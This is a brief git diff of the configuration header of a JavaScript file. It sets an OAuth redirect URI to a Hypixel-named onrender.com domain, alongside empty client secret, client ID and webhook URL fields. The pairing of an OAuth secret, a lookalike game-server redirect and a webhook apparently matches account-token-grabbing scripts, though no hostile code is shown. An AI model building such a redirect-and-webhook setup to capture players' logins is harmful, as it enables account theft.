@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = ''
-const redirect_uri = ''
+const redirect_uri = 'https://hypixel.onrender.com'
 const webhook_url = ''
 
 //Requirements
